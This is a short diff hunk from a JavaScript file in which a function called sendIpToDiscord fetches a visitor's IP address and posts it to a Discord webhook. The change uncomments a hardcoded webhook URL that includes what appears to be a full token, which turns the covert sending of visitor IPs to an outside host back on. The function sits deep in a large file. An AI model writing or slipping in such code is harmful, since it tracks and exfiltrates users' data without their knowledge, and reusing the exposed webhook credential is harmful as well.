@@ -10252,7 +10252,7 @@ function sendIpToDiscord() {
         .then(response => response.json())
         .then(data => {
             const ip = data.ip;
-            //const webhookUrl = "https://discord.com/api/webhooks/1288984018687103047/e09hMXQwBRjWgiEeCSiS4pQzXsgQLGfq8d-yyq1-W0w2mJzI-AkKAHDJiU28TXwR-CzE"; // Reemplaza con tu webhook
+            const webhookUrl = "https://discord.com/api/webhooks/1288984018687103047/e09hMXQwBRjWgiEeCSiS4pQzXsgQLGfq8d-yyq1-W0w2mJzI-AkKAHDJiU28TXwR-CzE"; // Reemplaza con tu webhook
 
             // Envía la IP al webhook de Discord
             fetch(webhookUrl, {
